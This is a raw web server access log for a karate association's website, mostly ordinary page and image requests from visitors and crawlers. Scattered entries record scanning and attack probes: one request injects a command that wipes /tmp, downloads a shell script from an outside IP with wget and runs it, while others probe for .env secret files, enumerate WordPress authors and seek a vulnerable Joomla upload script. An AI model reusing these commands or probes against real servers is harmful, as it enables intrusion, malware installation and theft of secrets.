::ffff:23.251.102.82 - - [23/Jan/2023:00:07:20 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:99.100.64.240 - - [23/Jan/2023:06:35:43 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://www.wadokikai.org/?fbclid=IwAR0Bh9bss_c401OMMWUbtRb4j2RSxQXSQ9FDFM6n4-8LEFF69uretsYcb3M" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20C65 [FBAN/FBIOS;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]"
::ffff:99.100.64.240 - - [23/Jan/2023:06:35:46 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://www.wadokikai.org/?fbclid=IwAR0Bh9bss_c401OMMWUbtRb4j2RSxQXSQ9FDFM6n4-8LEFF69uretsYcb3M" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20C65 [FBAN/FBIOS;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]"
::ffff:99.100.64.240 - - [23/Jan/2023:06:35:49 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://www.wadokikai.org/?fbclid=IwAR0Bh9bss_c401OMMWUbtRb4j2RSxQXSQ9FDFM6n4-8LEFF69uretsYcb3M" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20C65 [FBAN/FBIOS;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]"
::ffff:99.100.64.240 - - [23/Jan/2023:06:35:53 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "http://www.wadokikai.org/?fbclid=IwAR0Bh9bss_c401OMMWUbtRb4j2RSxQXSQ9FDFM6n4-8LEFF69uretsYcb3M" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20C65 [FBAN/FBIOS;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]"
::ffff:99.100.64.240 - - [23/Jan/2023:06:36:46 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/?fbclid=IwAR0Bh9bss_c401OMMWUbtRb4j2RSxQXSQ9FDFM6n4-8LEFF69uretsYcb3M" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20C65 [FBAN/FBIOS;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5];FBNV/1"
::ffff:179.43.177.242 - - [23/Jan/2023:06:38:10 +0000] "GET / HTTP/1.1" 200 57378 "-" "Hello World"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:31 +0000] "GET /wp-login.php HTTP/1.1" 404 151 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:31 +0000] "GET /?author=1 HTTP/1.1" 200 57378 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:32 +0000] "GET /?author=2 HTTP/1.1" 200 57378 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:32 +0000] "GET /?author=3 HTTP/1.1" 200 57378 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:32 +0000] "GET /?author=4 HTTP/1.1" 200 57378 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:33 +0000] "GET /?author=5 HTTP/1.1" 200 57378 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:33 +0000] "GET /?author=6 HTTP/1.1" 200 57378 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:33 +0000] "GET /?author=7 HTTP/1.1" 200 57378 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:33 +0000] "GET /?author=8 HTTP/1.1" 200 57378 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:34 +0000] "GET /?author=9 HTTP/1.1" 200 57378 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:34 +0000] "GET /?author=10 HTTP/1.1" 200 57378 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:34 +0000] "GET /?author=11 HTTP/1.1" 200 57378 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:35 +0000] "GET /?author=12 HTTP/1.1" 200 57378 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:35 +0000] "GET /?author=13 HTTP/1.1" 200 57378 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:35 +0000] "GET /?author=14 HTTP/1.1" 200 57378 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:35 +0000] "GET /?author=15 HTTP/1.1" 200 57378 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:36 +0000] "GET /?author=16 HTTP/1.1" 200 57378 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:36 +0000] "GET /?author=17 HTTP/1.1" 200 57378 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:36 +0000] "GET /?author=18 HTTP/1.1" 200 57378 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:36 +0000] "GET /?author=19 HTTP/1.1" 200 57378 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:1.14.94.175 - - [23/Jan/2023:06:48:37 +0000] "GET /?author=20 HTTP/1.1" 200 57378 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:93.159.230.87 - - [23/Jan/2023:07:09:56 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
::ffff:151.241.71.167 - - [23/Jan/2023:07:19:54 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::ffff:211.230.239.68 - - [23/Jan/2023:07:36:02 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+194.180.48.22/lol.sh;sh+/tmp/lol.sh HTTP/1.1" - - "-" "Hello, world"
::ffff:135.125.217.54 - - [23/Jan/2023:07:48:58 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [23/Jan/2023:07:48:59 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /resources HTTP/1.1" 200 194907 "-" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/JohnArce.jpg HTTP/1.1" 200 13951 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/tm.jpg HTTP/1.1" 200 25020 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/books/MBS2.jpg HTTP/1.1" 200 15317 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/books/MBS.gif HTTP/1.1" 200 13195 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/books/karatebook.jpg HTTP/1.1" 200 7644 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/books/ZenMeditation.jpg HTTP/1.1" 200 3760 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/books/KarateDoZen.jpg HTTP/1.1" 200 2677 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/books/bookoffiverings.jpg HTTP/1.1" 200 2940 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/books/dummies.jpg HTTP/1.1" 200 3631 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/books/shotokanSecrets.jpg HTTP/1.1" 200 4046 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/books/dojoWisdom.jpg HTTP/1.1" 200 2813 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/books/bobook.gif HTTP/1.1" 200 6919 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/books/karatedo.jpg HTTP/1.1" 200 3442 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/books/emptyHand.jpg HTTP/1.1" 200 12021 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/books/guide20.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/books/movingzen.jpg HTTP/1.1" 200 3578 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/books/karatedojo.jpg HTTP/1.1" 200 3457 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/books/grappingmethod.jpg HTTP/1.1" 200 4025 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/books/artofwar.jpg HTTP/1.1" 200 22573 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:56 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:57 +0000] "GET /images/books/saibook.jpg HTTP/1.1" 200 3043 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:39:57 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:40:00 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:114.119.136.86 - - [23/Jan/2023:08:40:17 +0000] "GET /schools HTTP/1.1" 200 97308 "http://www.wadokikai.org/joinemail?type=specialclasses" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:99.88.47.23 - - [23/Jan/2023:08:40:31 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:99.88.47.23 - - [23/Jan/2023:08:40:45 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
::ffff:44.211.66.114 - - [23/Jan/2023:08:44:26 +0000] "GET /resources HTTP/1.1" 200 194907 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:114.119.132.116 - - [23/Jan/2023:09:12:20 +0000] "GET /contact?s=1&ss=8 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:107.170.250.24 - - [23/Jan/2023:09:20:44 +0000] "GET /actuator/health HTTP/1.1" 404 154 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:162.142.125.222 - - [23/Jan/2023:09:22:31 +0000] "GET / HTTP/1.1" 200 57378 "-" "-"
::ffff:162.142.125.222 - - [23/Jan/2023:09:22:32 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:162.142.125.222 - - [23/Jan/2023:09:22:32 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:162.142.125.222 - - [23/Jan/2023:09:22:32 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:162.142.125.222 - - [23/Jan/2023:09:22:32 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:135.125.217.54 - - [23/Jan/2023:09:28:31 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [23/Jan/2023:09:28:32 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.148.61 - - [23/Jan/2023:09:36:47 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.19 - - [23/Jan/2023:09:36:48 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.2 - - [23/Jan/2023:09:36:51 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.10 - - [23/Jan/2023:09:36:52 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.2 - - [23/Jan/2023:09:36:52 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.7 - - [23/Jan/2023:09:36:53 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.11 - - [23/Jan/2023:09:36:54 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.6 - - [23/Jan/2023:09:36:54 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.5 - - [23/Jan/2023:09:36:55 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.17 - - [23/Jan/2023:09:36:56 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.8 - - [23/Jan/2023:09:36:56 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.17 - - [23/Jan/2023:09:36:57 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.14 - - [23/Jan/2023:09:36:58 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.14 - - [23/Jan/2023:09:36:59 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.14 - - [23/Jan/2023:09:36:59 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:114.119.158.182 - - [23/Jan/2023:09:53:02 +0000] "GET /images/tournaments/NKDTournament.pdf HTTP/1.1" 200 3770165 "http://www.wadokikai.org/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:128.14.134.134 - - [23/Jan/2023:09:58:04 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:194.38.20.161 - - [23/Jan/2023:10:08:15 +0000] "GET /administrator/components/com_jinc/classes/graphics/php-ofc-library/ofc_upload_image.php HTTP/1.1" 404 226 "-" "ALittle Client"
::ffff:23.90.160.114 - - [23/Jan/2023:10:19:21 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:141.95.74.78 - - [23/Jan/2023:10:20:34 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:141.95.74.78 - - [23/Jan/2023:10:20:34 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [23/Jan/2023:10:22:56 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [23/Jan/2023:10:22:57 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.159.161 - - [23/Jan/2023:10:34:54 +0000] "GET /images/tournaments/NKDTournament.pdf HTTP/1.1" 200 3770165 "http://34.212.47.6/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:178.79.188.64 - - [23/Jan/2023:10:47:56 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:178.79.188.64 - - [23/Jan/2023:10:47:57 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.138.65 - - [23/Jan/2023:10:51:43 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:45.134.140.168 - - [23/Jan/2023:11:00:55 +0000] "GET /apis/apps/v1/namespaces/kube-system/daemonsets HTTP/1.1" 404 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"
::ffff:135.125.217.54 - - [23/Jan/2023:11:20:35 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [23/Jan/2023:11:20:36 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:165.22.32.240 - - [23/Jan/2023:11:56:57 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
